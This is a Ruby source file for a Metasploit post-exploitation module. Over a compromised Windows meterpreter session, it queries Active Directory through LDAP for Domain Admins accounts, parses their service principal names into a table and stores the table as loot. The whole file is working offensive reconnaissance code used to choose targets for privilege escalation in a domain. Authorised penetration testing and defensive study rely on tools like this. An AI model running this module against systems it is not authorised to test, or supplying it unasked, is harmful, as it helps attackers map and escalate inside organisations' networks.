##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Windows Gather Active Directory Service Principal Names',
      'Description'  => %Q{
        This module will enumerate servicePrincipalName in the default AD directory
        where the user is a member of the Domain Admins group.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Ben Campbell', #Metasploit Module
          'Scott Sutherland' #Original Powershell Code
        ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
      'References'   =>
        [
          ['URL', 'https://www.netspi.com/blog/entryid/214/faster-domain-escalation-using-ldap'],
        ]
    ))

    register_options([
      OptString.new('FILTER', [true, 'Search filter, DOM_REPL will be automatically replaced', '(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DOM_REPL))'])
    ])

    deregister_options('FIELDS')
  end

  def run
    domain ||= datastore['DOMAIN']
    domain ||= get_domain

    fields = ['cn','servicePrincipalName']

    search_filter = datastore['FILTER']
    max_search = datastore['MAX_SEARCH']

    # This needs checking against LDAP improvements PR.
    dn = get_default_naming_context(domain)

    if dn.blank?
      fail_with(Failure::Unknown, "Unable to retrieve the Default Naming Context")
    end

    search_filter.gsub!('DOM_REPL',dn)

    begin
      q = query(search_filter, max_search, fields, domain)
    rescue RuntimeError => e
      # Raised when the default naming context isn't specified as distinguished name
      print_error(e.message)
      return
    end

    if q.nil? or q[:results].empty?
      return
    end

    fields << "Service"
    fields << "Host"

    # Results table holds raw string data
    results_table = Rex::Text::Table.new(
      'Header'     => "Service Principal Names",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => ['cn', 'Service', 'Host']
    )

    q[:results].each do |result|
      rows = parse_result(result, fields)
      unless rows.nil?
        rows.each do |row|
          results_table << row
        end
      end
    end

    print_line results_table.to_s
    stored_path = store_loot('ad.computers', 'text/plain', session, results_table.to_csv)
    print_good("Results saved to: #{stored_path}")
  end

  def parse_result(result, fields)
    rows = []
    row = []

    0.upto(fields.length-1) do |i|
      field = (result[i][:value].nil? ? "" : result[i][:value])

      if fields[i] == 'servicePrincipalName'
        break if field.blank?
        spns = field.split(',')
        spns.each do |spn|
          new_row = row.dup
          split = spn.split('/')
          if split.length == 2
            new_row << split[0]
            new_row << split[1]
            rows << new_row
          else
            print_error("Invalid SPN: #{field}")
          end
        end
      else
        row << field
      end

    end

    rows
  end
end

